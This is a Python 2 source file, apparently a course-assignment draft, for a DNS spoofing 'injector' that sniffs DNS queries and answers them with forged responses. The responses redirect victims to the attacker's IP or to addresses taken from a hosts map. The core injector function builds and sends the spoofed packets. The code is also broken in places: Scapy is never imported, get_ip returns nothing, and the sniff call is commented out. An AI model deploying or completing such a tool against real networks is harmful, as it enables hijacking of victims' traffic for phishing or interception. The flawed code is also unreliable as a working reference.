#https://pymotw.com/2/optparse/
#https://stackoverflow.com/questions/11735821/python-get-localhost-ip (hotname to ip)
#!/usr/bin/python


#pypcap library for default interfac?? piazaa (https://piazza.com/class/j6lyorzz9qj5i3?cid=175)



from optparse import OptionParser
import netifaces as ni
import os
import socket
import pcap



def get_ip(ifname):
    	ni.ifaddresses(ifname)
	ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
	print ip  # should print "192.168.100.37"

#def injector(packet):
#    if packet.haslayer(TCP):
#        print pkt.summary()
#        print pkt.show()
#        print pkt[TCP]

def injector(pkt):
	if((pkt[IP].src in expression) or (expression == None)): 
		redirect_to = get_ip(interface)
		if pkt.haslayer(DNSQR): # DNS question record
			affectedHost = pkt[DNSQR].qname
			if hostsmap!=None:
				file=open(hostsmap,"r")
				for line in file:
					if affectedHost in line:	
	                    			row = line.split(" ")
	                    			redirect_to = row[0]
	
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
			send(spoofed_pkt)
			print 'Sent:', spoofed_pkt.summary()

if __name__ == '__main__':
	expression = None
	parser = OptionParser()
	parser.set_conflict_handler("resolve")
	parser.add_option('-i', dest="interface",default=pcap.lookupdev())
	parser.add_option('-h', dest="hostsmap")

	(options, remainder) = parser.parse_args()
	expression = remainder
	print options.interface
	print options.hostsmap
	if expression:
		print expression[0]
	#get_ip('ens33')

	#sniff(filter=expression, prn=injector, store=0, iface=interface)



